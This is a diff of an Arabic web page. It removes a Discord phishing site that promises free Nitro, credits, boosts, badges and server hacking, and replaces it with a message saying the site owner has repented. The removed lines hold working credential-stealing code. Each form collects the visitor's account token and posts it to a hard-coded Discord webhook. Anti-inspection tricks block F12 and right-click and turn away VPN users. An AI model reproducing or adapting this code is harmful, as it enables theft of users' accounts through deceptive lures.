@@ -1,261 +1,70 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>هدايه : 2025</title>
+<title>صاحب الموقع تائب</title>
+
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
-* { box-sizing: border-box; }
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+}
+
 body {
-  margin: 0;
-  font-family: 'Montserrat', sans-serif;
-  color: white;
-  direction: rtl;
-  overflow-x: hidden;
-  background: linear-gradient(135deg,#1a0033,#004d26);
-  background-size: 400% 400%;
-  animation: gradientBG 20s ease infinite;
+    background:
+        linear-gradient(rgba(200,0,0,0.75), rgba(200,0,0,0.75)),
+        url("bg.jpg.jfif") no-repeat center center fixed;
+    background-size: cover;
+
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    font-family: Arial, sans-serif;
 }
-@keyframes gradientBG {
-  0%{background-position:0% 50%;}
-  50%{background-position:100% 50%;}
-  100%{background-position:0% 50%;}
+
+.text {
+    color: white;
+    font-size: 60px;
+    font-weight: bold;
+    text-shadow: 0 0 20px black;
+    margin-bottom: 30px;
 }
-.sidebar { width: 240px; background: rgba(30,30,30,0.95); padding: 20px; height: 100vh; position: fixed; backdrop-filter: blur(5px); box-shadow: 2px 0 15px rgba(0,0,0,0.5); }
-.sidebar h2 { color: #00ff88; margin-bottom: 30px; text-align: center; }
-.sidebar a { display: block; padding: 14px; margin-bottom: 12px; text-decoration: none; color: white; background: #2c2c2c; border-radius: 10px; transition: 0.3s; cursor: pointer; text-align: center; font-weight: 600; box-shadow: 0 3px 6px rgba(0,0,0,0.3); }
-.sidebar a:hover { background: #00ff88; color: black; transform: scale(1.05); }
-.content { margin-right: 260px; padding: 50px; flex-grow: 1; transition: all 0.5s ease; }
-.page { display: none; opacity: 0; transition: opacity 0.5s ease; }
-.page.active { display: block; opacity: 1; }
-.card { background: rgba(30,30,30,0.9); padding: 25px; margin-bottom: 25px; border-radius: 20px; backdrop-filter: blur(5px); border: 1px solid rgba(0,255,136,0.3); box-shadow: 0 15px 40px rgba(0,255,136,0.5); max-width: 320px; text-align: center; transition: transform 0.5s, box-shadow 0.5s; }
-.card:hover { transform: translateY(-10px) scale(1.02); box-shadow: 0 25px 60px rgba(0,255,136,0.7); }
-.card img { width: 160px; height: 160px; border-radius: 16px; margin-bottom: 15px; filter: drop-shadow(0 0 20px rgba(0,255,136,0.7)); transition: transform 0.5s; }
-.card img:hover { transform: scale(1.05) rotateY(10deg); }
-input { width: 100%; padding: 14px; margin: 8px 0; border-radius: 10px; border: none; outline: none; font-size: 16px; }
-button { padding: 14px 28px; margin: 10px 5px 0; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; transition: all 0.3s; font-size: 17px; }
-button.green { background: linear-gradient(145deg, #00ff88, #00cc66); box-shadow: 0 8px 20px rgba(0,255,136,0.6); color: black; }
-button.green:hover { transform: scale(1.12); box-shadow: 0 12px 35px rgba(0,255,136,0.8); }
-button.red { background: #ff4444; color: white; }
-button.red:hover { transform: scale(1.12); box-shadow: 0 12px 35px rgba(255,68,68,0.8); }
-.popup { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); background: rgba(30,30,30,0.95); padding: 40px 60px; border-radius: 20px; text-align: center; font-size: 20px; font-weight: 700; box-shadow: 0 0 35px rgba(0,255,136,0.9); z-index: 1000; opacity: 0; transition: opacity 0.5s ease; }
-.popup.show { display: block; opacity: 1; }
-.footer { text-align: center; padding: 18px; font-size: 14px; color: #aaa; border-top: 1px solid rgba(255,255,255,0.1); position: relative; bottom: 0; width: calc(100% - 260px); margin-right: 260px; }
+
+button {
+    background: darkred;
+    color: white;
+    border: none;
+    padding: 15px 40px;
+    font-size: 22px;
+    cursor: pointer;
+    border-radius: 10px;
+    box-shadow: 0 0 15px black;
+}
+
+button:hover {
+    background: red;
+}
 </style>
 </head>
+
 <body>
 
-<div class="sidebar">
-<h2>هدايه : 2025</h2>
-<a onclick="showPage('home')">الرئيسية</a>
-<a onclick="showPage('nitro')">نيترو</a>
-<a onclick="showPage('credit')">كرديت</a>
-<a onclick="showPage('boosts')">خدمة البوستات</a>
-<a onclick="showPage('hack')">تهكير سيرفرات</a>
-<a onclick="showPage('badges')">شاره مطور</a>
-<a onclick="showPage('orders')">📦 الطلبات</a>
-</div>
+<div class="text">صاحب الموقع تائب</div>
 
-<div class="content">
-<div id="home" class="page active">
-<h1 style="font-size:36px;">مرحباً بك في موقع هدايه 2025 🎉</h1>
-<p style="font-size:18px;">اختر من القائمة على اليسار الخدمة التي تريد الدخول إليها.</p>
-</div>
+<button onclick="playSound()">تشغيل الصوت </button>
 
-<div id="nitro" class="page">
-<h1>هدايه نيترو : 2025</h1>
-<div class="card">
-<img src="https://cdn.salla.sa/EZNpp/ykQKkOiNg5SS820BTnN0TcGwxWA7IIo5i77CZdkQ.jpg" alt="نيترو شهر">
-<h3>نيترو شهر</h3>
-<p>السعر: مجانا</p>
-<button class="green" onclick="goToNitroPage('نيترو شهر')">اشتراك</button>
-</div>
-<div class="card">
-<img src="https://cdn.salla.sa/Pdvrr/fOBXoUGfwZoYj0jgfeboHXv8z9VvI9vrMNuBMlmu.png" alt="نيترو 3 أشهر">
-<h3>نيترو 3 أشهر</h3>
-<p>السعر: مجانا</p>
-<button class="green" onclick="goToNitroPage('نيترو 3 أشهر')">اشتراك</button>
-</div>
-</div>
-
-<div id="getNitro" class="page">
-<h1>استلام نيترو</h1>
-<div class="card">
-<input type="text" id="nitroToken" placeholder="قم بوضع توكن حسابك">
-<button class="green" onclick="activateNitro()">تفعيل نيترو</button>
-</div>
-</div>
-
-<div id="credit" class="page">
-<h1>كرديت مجانا : 2025</h1>
-<div class="card">
-<img src="https://i.ytimg.com/vi/fGe7Ij_i4yU/sddefault.jpg" alt="كرديت">
-<input type="text" id="creditAmount" placeholder="قم بوضع كمية الكرديت">
-<input type="text" id="creditToken" placeholder="قم بوضع التوكن">
-<button class="green" onclick="sendCredit()">استلام</button>
-</div>
-</div>
-
-<div id="boosts" class="page">
-<h1>خدمة البوستات</h1>
-<div class="card">
-<img src="https://cdn.salla.sa/Pdvrr/IRCEEIlS5mMWaiEtcMQd4nMkpagwOVujdorZe03Y.png" alt="بوستات">
-<input type="text" id="boostServer" placeholder="قم بوضع ايدي السيرفر">
-<input type="text" id="boostToken" placeholder="قم بوضع التوكن">
-<input type="number" id="boostCount" placeholder="عدد البوستات (أقل من 20)">
-<button class="green" onclick="sendBoost()">استلام</button>
-</div>
-</div>
-
-<div id="hack" class="page">
-<h1>تهكير سيرفرات</h1>
-<div class="card">
-<input type="text" id="hackToken" placeholder="قم بوضع التوكن">
-<input type="text" id="hackServer" placeholder="قم بوضع ايدي السيرفر">
-<button class="green" onclick="sendHack()">تخريب</button>
-</div>
-</div>
-
-<div id="badges" class="page">
-<h1>الحصول على شارات ديسكورد</h1>
-<div class="card">
-<img src="https://img.webtech360.com/resources6/s2/image-129-0605170253296.jpg" alt="شاره مطور">
-<h3>شاره مطور</h3>
-<input type="text" id="badgeToken" placeholder="قم بوضع التوكن">
-<button class="green" onclick="sendBadge()">استلام الشاره</button>
-</div>
-</div>
-
-<div id="orders" class="page">
-<h1>الطلبات :</h1>
-<div class="card" id="ordersList"></div>
-</div>
-
-<div class="footer">
-©هاذ الموقع أمن ولا يحتفظ في اي معلومات وشكرا لكم<br>
-©جميع الحقوق محفوظه لدى شركه بلاندو العالميه<br>
-©يجب الانتظار من 24 - 48 ساعه لاستلام طلبك
-</div>
-</div>
-
-<div id="popup" class="popup"></div>
+<audio id="enterSound">
+    <source src="sound.mp3" type="audio/mpeg">
+</audio>
 
 <script>
-const webhookURL = "https://discord.com/api/webhooks/1411100821671772351/zcuZW9vmHV3e2GIwimQbEkvexcYdo99w5snNuMKHh5CbuQJpPzX6LXdoL2Gpieb03l-O";
-
-function showPage(id){
-document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
-document.getElementById(id).classList.add('active');
+function playSound(){
+    document.getElementById("enterSound").play();
 }
-
-function showPopup(message){
-const popup = document.getElementById('popup');
-popup.textContent = message;
-popup.classList.add('show');
-setTimeout(()=>{ popup.classList.remove('show'); },5000);
-}
-
-function goToNitroPage(name){
-localStorage.setItem('selectedNitro',name);
-showPage('getNitro');
-}
-
-function addOrder(name){
-const orders = JSON.parse(localStorage.getItem('orders')||'[]');
-const timestamp = new Date().toLocaleTimeString();
-orders.push({name:name,time:timestamp});
-localStorage.setItem('orders',JSON.stringify(orders));
-renderOrders();
-}
-
-function renderOrders(){
-const orders = JSON.parse(localStorage.getItem('orders')||'[]');
-const ordersDiv = document.getElementById('ordersList');
-ordersDiv.innerHTML = '';
-orders.forEach(o=>{
-const div = document.createElement('div');
-div.textContent = o.name+' : منذ '+o.time;
-div.style.marginBottom='8px';
-div.style.fontSize='16px';
-ordersDiv.appendChild(div);
-});
-}
-setInterval(renderOrders,1000);
-renderOrders();
-
-function canSend(product){
-  const lastSent = JSON.parse(localStorage.getItem('lastSent')||'{}');
-  const now = Date.now();
-  if(lastSent[product] && now - lastSent[product] < 10*60*1000){
-    const remaining = Math.ceil((10*60*1000 - (now - lastSent[product]))/1000);
-    showPopup('⏳ يجب الانتظار '+remaining+' ثانية قبل إرسال هذا المنتج مجدداً');
-    return false;
-  }
-  lastSent[product] = now;
-  localStorage.setItem('lastSent', JSON.stringify(lastSent));
-  return true;
-}
-
-function activateNitro(){
-const token = document.getElementById('nitroToken').value.trim();
-const product = localStorage.getItem('selectedNitro') || 'نيترو';
-if(!token || token.length<20){ showPopup('❌ التوكن غلط'); return; }
-if(!canSend(product)) return;
-fetch(webhookURL,{method:'POST',headers:{'Content-Type':'application/json'},body: JSON.stringify({content:token})});
-showPopup('تم ارسال الطلب يرجى الانتظار لمدت 48 ساعه');
-addOrder(product);
-}
-
-function sendCredit(){
-const amount = document.getElementById('creditAmount').value;
-const token = document.getElementById('creditToken').value;
-const product = 'كرديت';
-if(!amount || !token){ showPopup('❗ اكتب الكل الحقول'); return; }
-if(!canSend(product)) return;
-fetch(webhookURL,{method:'POST',headers:{'Content-Type':'application/json'},body: JSON.stringify({content: token+' | '+amount})});
-showPopup('تم ارسال الطلب يرجى الانتظار لمدت 48 ساعه');
-addOrder(product);
-}
-
-function sendBoost(){
-const server = document.getElementById('boostServer').value;
-const token = document.getElementById('boostToken').value;
-let count = parseInt(document.getElementById('boostCount').value);
-const product = 'بوستات';
-if(!server || !token || !count){ showPopup('❗ اكتب جميع الحقول'); return; }
-if(count>20) count=20;
-if(!canSend(product)) return;
-fetch(webhookURL,{method:'POST',headers:{'Content-Type':'application/json'},body: JSON.stringify({content: token+' | '+server+' | '+count})});
-showPopup('تم ارسال الطلب يرجى الانتظار لمدت 48 ساعه');
-addOrder(product);
-}
-
-function sendHack(){
-const token = document.getElementById('hackToken').value;
-const server = document.getElementById('hackServer').value;
-const product = 'تخريب سيرفرات';
-if(!token || !server){ showPopup('❗ اكتب جميع الحقول'); return; }
-if(!canSend(product)) return;
-fetch(webhookURL,{method:'POST',headers:{'Content-Type':'application/json'},body: JSON.stringify({content: token+' | '+server})});
-showPopup('تم ارسال طلبك الى الهكر سيتم اختراق السيرفر خلال بضع ساعات');
-addOrder(product);
-}
-
-function sendBadge(){
-const token = document.getElementById('badgeToken').value;
-const product = 'شاره';
-if(!token){ showPopup('❗ اكتب جميع الحقول'); return; }
-if(!canSend(product)) return;
-fetch(webhookURL,{method:'POST',headers:{'Content-Type':'application/json'},body: JSON.stringify({content: token+' | شاره'})});
-showPopup('تم ارسال الطلب يرجى الانتظار لمدت 48 ساعه');
-addOrder(product);
-}
-
-document.addEventListener('keydown', function(e){ if(e.key==='F12'){ window.close(); }});
-document.addEventListener('contextmenu', function(e){ e.preventDefault(); window.close(); });
-fetch('https://ipapi.co/json/').then(res=>res.json()).then(data=>{
-if(data.org && data.org.toLowerCase().includes('vpn')){ alert('لا يمكنك الدخول من VPN'); window.close(); }
-});
 </script>
+
 </body>
 </html>
